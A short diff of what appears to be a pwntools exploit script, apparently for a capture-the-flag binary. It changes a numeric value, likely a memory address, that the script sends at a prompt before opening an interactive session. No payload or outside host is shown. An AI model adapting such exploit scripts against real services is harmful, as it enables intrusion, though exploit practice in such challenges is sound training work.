@@ -54,7 +54,7 @@ for cnt_try in range(0, 2):
         print('fffffinished sending offset ', str(offset + 1))
 
         r_out = 'Chose the number ' + str(offset) + ': '
-        r.sendlineafter(r_out, '6299952')
+        r.sendlineafter(r_out, '6299888')
 
 r.interactive()
 r.close()
